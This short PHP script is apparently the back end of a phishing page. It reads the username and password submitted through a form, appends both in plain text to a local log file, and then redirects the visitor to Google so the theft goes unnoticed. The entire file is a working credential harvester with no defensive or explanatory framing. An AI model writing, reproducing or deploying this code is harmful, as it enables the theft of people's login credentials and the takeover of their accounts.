<?php
$file = fopen("log.txt", "a");

$username = $_POST['username'];
$password = $_POST['password'];

fwrite($file, "Username: " . $username . " Password: " . $password . "\n");

fclose($file);

header('Location: https://www.google.com');
exit();
?>
